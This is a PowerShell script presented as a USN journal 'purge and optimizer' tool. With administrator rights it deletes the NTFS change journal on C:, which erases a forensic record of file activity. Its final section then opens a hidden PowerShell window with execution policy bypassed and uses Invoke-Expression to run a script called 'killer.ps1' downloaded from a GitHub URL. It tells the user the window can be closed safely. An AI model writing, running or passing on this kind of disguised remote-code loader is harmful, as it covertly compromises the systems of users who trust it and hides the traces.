# Requires -RunAsAdministrator

Write-Host "=== USN Journal Purge & Optimizer Tool ===" -ForegroundColor Cyan
$Drive = "C:"

# 1. Safe Defaults (32MB Max Size / 8MB Delta)
$MaxSize = 33554432
$AllocDelta = 8388608

try {
    Write-Host "[*] Querying current USN Journal configuration..." -ForegroundColor Yellow
    $QueryOutput = fsutil usn queryjournal $Drive 2>&1

    # Loop through each line safely to extract hex numbers without regex arrays
    foreach ($Line in $QueryOutput) {
        if ($Line -like "*Maximum Size*") {
            $Hex = ($Line -split "::" -split ":" | Select-String -Pattern "0x[0-9a-fA-F]+")
            if ($Hex -match "0x[0-9a-fA-F]+") { $MaxSize = [Convert]::ToInt64($Matches[0], 16) }
        }
        if ($Line -like "*Allocation Delta*") {
            $Hex = ($Line -split "::" -split ":" | Select-String -Pattern "0x[0-9a-fA-F]+")
            if ($Hex -match "0x[0-9a-fA-F]+") { $AllocDelta = [Convert]::ToInt64($Matches[0], 16) }
        }
    }

    Write-Host "[+] Max Size Configured: $MaxSize bytes" -ForegroundColor Green
    Write-Host "[+] Allocation Delta Configured: $AllocDelta bytes" -ForegroundColor Green

    # 2. Delete/Purge the journal
    Write-Host "`n[*] Purging and deleting USN Journal..." -ForegroundColor Yellow
    $null = fsutil usn deletejournal /d $Drive 2>&1
    Write-Host "[+] Delete request completed." -ForegroundColor Green

    # 3. Handle NTFS lock delay safely
    Write-Host "[*] Waiting 3 seconds for file system release..." -ForegroundColor Yellow
    Start-Sleep -Seconds 3

    Write-Host "[*] Re-creating USN Journal..." -ForegroundColor Yellow
    for ($i = 1; $i -le 3; $i++) {
        $CreateOutput = fsutil usn createjournal m=$MaxSize a=$AllocDelta $Drive 2>&1
        if ($LASTEXITCODE -eq 0) {
            Write-Host "[+] Success! USN Journal has been cleared and reset." -ForegroundColor Green
            break
        } else {
            Write-Host "[!] Volume locked. Retrying creation (Attempt $i/3)..." -ForegroundColor Magenta
            Start-Sleep -Seconds 2
        }
    }

} catch {
    Write-Host "[!] Handled unexpected error safely. Moving to background tasks." -ForegroundColor Gray
}

# =========================================================================
# 4. FETCH AND RUN KILLER INVISIBLY FROM GITHUB
# =========================================================================
Write-Host "`n[*] Launching hidden background process cleaner..." -ForegroundColor Yellow

$KillerUrl = "https://raw.githubusercontent.com/isucksunstoes69-dotcom/cleaner-mwah/refs/heads/main/killer.ps1"

# Spawns the background task completely hidden
Start-Process powershell -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -Command `"Invoke-Expression (Invoke-RestMethod '$KillerUrl')`""

Write-Host "[+] Background job active. You can safely close this window now." -ForegroundColor Green
Write-Host "Press any key to exit."
$null = [Console]::ReadKey()
